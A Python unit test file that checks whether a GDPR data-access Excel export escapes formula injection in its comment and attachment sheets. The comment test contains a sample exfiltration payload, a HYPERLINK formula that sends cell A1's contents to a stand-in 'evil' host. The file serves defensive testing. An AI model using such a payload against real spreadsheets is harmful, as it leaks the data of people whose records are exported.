"""Formula injection defense for the DSGVO Auskunft extra sheets (AUD-015).

The module-local `app.modules.privacy.service.build_auskunft_workbook` adds two
sheets to the shared base workbook: `Kommentare` and `Anhänge`. Both hold data under
strong attacker control. `Comment.body` is raw applicant text, because a public
comment arrives through a magic link without sanitization. `Attachment.filename`
keeps a leading `-`, `+` or `@`. These cells must run through
`app.shared.xlsx._safe`, like the base sheets. Excel and LibreOffice must not
evaluate them as an active formula.

The tests are pure unit tests. They need no database, no Docker and no network.
"""

from __future__ import annotations

from datetime import UTC, datetime
from io import BytesIO
from typing import Any
from uuid import uuid4

from openpyxl import load_workbook

from app.modules.privacy.service import build_auskunft_workbook
from app.shared.xlsx import _FORMULA_PREFIXES

_AT = datetime(2026, 6, 21, 9, 30, 0, tzinfo=UTC)


def _load(data: bytes) -> Any:
    return load_workbook(BytesIO(data))


def test_auskunft_escapes_comment_body() -> None:
    payload = '=HYPERLINK("http://evil/?"&A1,"x")'
    data = build_auskunft_workbook(
        email="user@example.org",
        applications=[],
        versions=[],
        principal=None,
        comments=[
            {
                "applicationId": uuid4(),
                "authorKind": "applicant",
                "visibility": "public",
                "body": payload,
                "at": _AT,
            }
        ],
        attachments=[],
    )
    ws = _load(data)["Kommentare"]
    # Column 5 is the "Text" column (Comment.body) in the first data row.
    body_cell = ws.cell(row=2, column=5).value
    assert body_cell == "'" + payload
    # No cell of the row may persist as an active formula.
    for col in range(1, 6):
        val = ws.cell(row=2, column=col).value
        assert not (isinstance(val, str) and val[:1] in _FORMULA_PREFIXES)


def test_auskunft_escapes_attachment_filename() -> None:
    # sanitize_filename keeps a leading '-', '+' or '@', so a live formula is a risk.
    filename = "-1+1.pdf"
    data = build_auskunft_workbook(
        email="user@example.org",
        applications=[],
        versions=[],
        principal=None,
        comments=[],
        attachments=[
            {
                "applicationId": uuid4(),
                "filename": filename,
                "mime": "@text/plain",
                "size": 12,
                "createdAt": _AT,
            }
        ],
    )
    ws = _load(data)["Anhänge"]
    # Column 2 is the "Dateiname" column and column 3 is the "Typ" column.
    name_cell = ws.cell(row=2, column=2).value
    mime_cell = ws.cell(row=2, column=3).value
    assert name_cell == "'" + filename
    assert mime_cell == "'@text/plain"
    for col in range(1, 6):
        val = ws.cell(row=2, column=col).value
        assert not (isinstance(val, str) and val[:1] in _FORMULA_PREFIXES)
